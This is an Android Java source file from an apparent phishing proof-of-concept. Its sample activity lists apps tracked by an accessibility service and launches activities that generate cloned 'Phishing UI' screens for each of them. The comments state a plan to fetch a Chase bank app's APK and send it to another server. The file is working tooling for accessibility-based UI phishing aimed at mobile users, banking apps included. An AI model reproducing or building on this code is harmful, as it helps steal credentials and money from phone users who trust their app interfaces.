package example.com.seaphish.uicarise.writenodesxml;

import android.content.Context;
import android.content.Intent;
import android.graphics.Point;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.Spannable;
import android.text.method.LinkMovementMethod;
import android.text.style.ClickableSpan;
import android.text.util.Linkify;
import android.view.Display;
import android.view.View;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.io.File;
import java.io.IOException;

/*  This is just a sample activity - the interface contains only one button and link which are used
* as: Button : Get APK file and Link: Click to Test the Phished Apps UI*/
public class SimpleActivity extends AppCompatActivity implements  View.OnClickListener {


    Button bGetAPK;
    TextView linkTest;

    /*  In this sample activity - once the interface is loaded we have one button and link of use
     * If the accessibility service - Service_WriteXML is already running, then the we clicking the link
      * we get a set of buttons displaying names of package for which the accessibiltiy is enabled */
    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_simple);

        linkTest = (TextView) findViewById(R.id.testLink);
        linkTest.setClickable(true);

        linkTest.setMovementMethod(LinkMovementMethod.getInstance());
        Spannable mySpannable = (Spannable)linkTest.getText();
        ClickableSpan myClickableSpan = new ClickableSpan()
        {
            @Override
            public void onClick(View widget) {
                System.out.println("Test link clicked");
                createButtons();
            }
        };
        mySpannable.setSpan(myClickableSpan, 0, linkTest.getText().length(), Spannable.SPAN_INCLUSIVE_INCLUSIVE);

        /* make the link clickable */
        linkTest.setOnClickListener(this);

        bGetAPK = (Button) findViewById(R.id.login);

        /* make the button clickable and handle the click event to perform desired operation */
        bGetAPK.setOnClickListener(this);

        Display display = getWindowManager().getDefaultDisplay();
        Point size = new Point();
        display.getSize(size);
        int width = size.x;
        int height = size.y;

        System.out.println("width: "+width);
        System.out.println("height :"+height);

        System.out.println("No. of Pakcages tracked by accessibility service: "+Service_WriteXML.packageName_Track.size());

        Context ctx = this.getApplicationContext();
        /* Start the sample background intent service */
        Intent i= new Intent(ctx,MyIntentService.class);
        ctx.startService(i);

    }

    /* Create the buttons dynamically - depends on the number of apps for which the accessibiltiy is enabled
     * each button has a name - displaying the package name of the app for which it can load the Phishing UI */
    void createButtons()
    {
        LinearLayout linear = (LinearLayout)findViewById(R.id.childLL);

        for (int i = 0; i < Service_WriteXML.packageName_Track.size(); i++)
        {
            LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT);

            Button btn = new Button(this);
            btn.setId(i);
            final int id_ = btn.getId();

            String tempBtnName = Service_WriteXML.packageName_Track.get(i).replace(".","_");


            btn.setText(tempBtnName);
            btn.setContentDescription(tempBtnName);

            linear.addView(btn, params);

            final Button btn1 = ((Button) findViewById(id_));

            /* handle the click event for each of the generated butttons */
            btn1.setOnClickListener(this);

            btn1.setOnClickListener(new View.OnClickListener()
            {
                public void onClick(View view) {
                    Intent generateUI = new Intent(getApplicationContext(),GeneratedActivity.class);
                    if(generateUI != null) {

                        /*  once the button is clicked - generate the Phishing UI using the GeneratedActivity.java
                        * We pass the package name - this makes the generating UI activity understand which
                        * Phishing GUI needs to be loaded - i.e. generate the phishing interface for which app*/
                        generateUI.putExtra("PkgName", (btn1.getText().toString() + ".txt"));

                        /*  start the activity to generate the phishing UI */
                        startActivity(generateUI);
                    }

                }
            });
        }
    }

    /* This button click - still needs to be tested
     * It should be able to fetch the apk - file for Chase bank app
      * and now this file can be transferred to any other server
      * given the app has been granted the permission to use the network and read the memory*/
    @Override
    public  void onClick(View v){

        switch(v.getId()){
            case R.id.login:

                //startActivity(new Intent(this,GeneratedActivity.class));
                File getApk = getTempFile(this.getApplicationContext(),"apkfile");
                System.out.println("get file name: "+ getApk.getName());

                break;

        }

    }

    /* This function - still needs to be tested
     * It is trying to fetch the apk file which was stored for one of the apps using the background intent
      * service. For now we were saving only the apk file of one Chase bank app assuming it
      * is installed on the smart phone*/
    public File getTempFile(Context context, String url) {
        File file = null;
        try {
            String fileName = Uri.parse(url).getLastPathSegment();
            System.out.println(context.getFilesDir());
            file = File.createTempFile(fileName, null, context.getCacheDir());
            if(file == null)
            {
                file = File.createTempFile(fileName, null, context.getFilesDir());
            }
        } catch (IOException e) {
            // Error while creating file
        }
        return file;
    }
}
